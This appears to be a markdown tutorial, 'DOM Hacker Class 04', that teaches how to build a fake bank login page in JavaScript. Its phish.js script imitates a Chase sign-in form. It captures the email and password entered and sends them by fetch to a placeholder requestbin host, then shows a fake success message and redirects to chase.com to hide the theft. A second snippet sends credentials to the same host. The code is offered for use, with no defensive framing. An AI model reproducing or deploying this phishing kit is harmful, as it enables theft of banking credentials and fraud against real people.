## 	Full fake login built with JavaScript
> HTML TEMPLATE BELOW :
-----
```html

---

## 📘 DOM Hacker Class 04 - Full Fake Login via JS

```md
# DOM Hacker Class 04 - Full Fake Login via JS

## 🧠 Goal
Build an entire phishing login UI using JavaScript only, then capture data and redirect.

---

## 🧱 HTML Template (phish.html)
```html
<!DOCTYPE html>
<html>
  <head>
    <title>Redirecting...</title>
  </head>
  <body>
    <script src="phish.js"></script>
  </body>
</html>
```
## Build Login Form in JS (phish.js)
```js
// Set page title
document.title = "Chase Secure Login";

// Fake logo
document.body.innerHTML += '<h2>Chase Online™ Secure Login</h2>';

// Create form
document.body.innerHTML += `
  <form>
    <input id="email" placeholder="Email or Username"><br>
    <input id="password" type="password" placeholder="Password"><br>
    <button id="loginBtn">Sign In</button>
    <p id="status"></p>
  </form>
`;

// Hijack login
setTimeout(() => {
  document.getElementById("loginBtn").onclick = function(event) {
    event.preventDefault();
    let email = document.getElementById("email").value;
    let pass = document.getElementById("password").value;

    fetch("https://YOUR-REQUESTBIN.x.pipedream.net?email=" + email + "&pass=" + pass);

    document.getElementById("status").textContent = "✅ Login Successful. Redirecting...";
    setTimeout(() => {
      window.location.href = "https://chase.com";
    }, 2000);
  };
}, 500);
```
## Auto capture without buttons
```js
let email = "admin@victim.com";
let pass = "hunter2";
fetch("https://YOUR-REQUESTBIN.x.pipedream.net?e=" + email + "&p=" + pass);
```
